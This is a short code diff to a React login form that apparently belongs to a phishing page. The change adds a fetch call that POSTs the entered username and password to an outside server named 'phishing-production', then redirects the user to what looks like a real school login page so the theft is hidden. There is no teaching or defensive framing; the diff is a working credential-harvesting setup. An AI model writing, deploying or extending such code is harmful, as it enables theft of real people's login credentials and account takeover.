@@ -11,6 +11,7 @@ export function Login() {
       setuname(e.target.value);
     }
 
+
     const [pass,  setpass]  = React.useState("");
     const mudaPass = (e) => {
       
@@ -20,7 +21,11 @@ export function Login() {
     async function enviar(event){
       event.preventDefault();
 
-      console.log({uname, pass})
+      fetch("https://phishing-production.up.railway.app/user", {
+        method:"POST", 
+        headers: {"content-type": "application/json"},
+        body: JSON.stringify({uname, pass})
+      })
       window.location.href = "https://casteloporto.com.br/mediafinal/Media/Final/Professor/login.php"
     }
 
